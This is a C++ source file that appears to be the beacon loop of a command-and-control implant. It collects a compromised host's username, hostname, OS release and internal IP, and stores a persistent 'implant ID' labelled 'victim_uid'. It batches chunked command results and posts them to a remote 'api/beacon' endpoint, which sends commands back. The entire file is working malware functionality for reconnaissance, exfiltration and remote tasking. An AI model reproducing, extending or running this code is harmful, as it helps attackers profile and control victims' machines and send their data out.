#include "BeaconLoop.hpp"

#include "SecureStorage.hpp"
#include "Types.hpp"
#include "Util/SafeLogger.hpp"

#include <arpa/inet.h>
#include <ifaddrs.h>
#include <limits.h>
#include <netdb.h>
#include <sys/utsname.h>
#include <unistd.h>

#include <filesystem>

namespace fs = std::filesystem;

void BeaconState::add_result(CommandResult result) {
    std::lock_guard lock(mtx_);
    pending_results_.push_back(std::move(result));
}

void BeaconState::add_results(std::vector<CommandResult> results) {
    std::lock_guard lock(mtx_);
    for (auto& result : results) {
        pending_results_.push_back(std::move(result));
    }
}

void BeaconState::enqueue_chunks(std::vector<CommandResult> chunks) {
    if (chunks.size() <= 1) {
        if (!chunks.empty()) {
            add_result(std::move(chunks.front()));
        }
        return;
    }

    add_result(std::move(chunks.front()));

    std::lock_guard lock(mtx_);
    for (std::size_t i = 1; i < chunks.size(); ++i) {
        chunk_queue_.push_back(std::move(chunks[i]));
    }
}

std::vector<CommandResult> BeaconState::take_results() {
    std::lock_guard lock(mtx_);
    auto results = std::move(pending_results_);
    pending_results_.clear();

    while (!chunk_queue_.empty() && results.size() < 8) {
        results.push_back(std::move(chunk_queue_.front()));
        chunk_queue_.pop_front();
    }

    return results;
}

std::string get_internal_ip() {
    struct ifaddrs* ifaddr = nullptr;
    struct ifaddrs* ifa = nullptr;
    std::string ip = "127.0.0.1";

    if (getifaddrs(&ifaddr) == -1) {
        return ip;
    }

    for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == nullptr || ifa->ifa_addr->sa_family != AF_INET) {
            continue;
        }

        char host[NI_MAXHOST];
        if (getnameinfo(
                ifa->ifa_addr,
                sizeof(struct sockaddr_in),
                host,
                NI_MAXHOST,
                nullptr,
                0,
                NI_NUMERICHOST) == 0) {
            const std::string temp_ip = host;
            if (temp_ip != "127.0.0.1") {
                ip = temp_ip;
                break;
            }
        }
    }

    freeifaddrs(ifaddr);
    return ip;
}

std::string get_or_create_implant_id() {
    const fs::path storage_path = "identity.dat";
    const auto loaded = SecureStorage::load_uuid(storage_path);
    if (loaded) {
        return loaded.value();
    }

    const std::string new_uuid = generate_uuid();
    SecureStorage::save_uuid(storage_path, new_uuid);
    return new_uuid;
}

std::vector<CommandDAO> BeaconState::send_beacon(cpppwn::RESTClient& rest_client) {
    static const std::string client_uuid = get_or_create_implant_id();

    try {
        BeaconRequest beacon;

        const char* user_env = std::getenv("USER");
        beacon.username = user_env ? user_env : "unknown";

        char host_buffer[HOST_NAME_MAX];
        gethostname(host_buffer, HOST_NAME_MAX);
        beacon.hostname = host_buffer;

        struct utsname buffer;
        if (uname(&buffer) == 0) {
            beacon.operating_system = std::string(buffer.sysname) + " " + buffer.release;
        } else {
            beacon.operating_system = "Linux";
        }

        beacon.internal_ip = get_internal_ip();
        beacon.external_ip = "auto";
        beacon.victim_uid = client_uuid;
        beacon.command_results = take_results();

        return rest_client.post<BeaconRequest, std::vector<CommandDAO>>("api/beacon", beacon);
    } catch (const cpppwn::RESTException& err) {
        logger::warn(
            "Beacon failed with HTTP {}: {}",
            err.status_code,
            err.response_body.empty() ? err.what() : err.response_body);
        return {};
    } catch (const std::exception& err) {
        logger::warn("Beacon failed: {}", err.what());
        return {};
    }
}
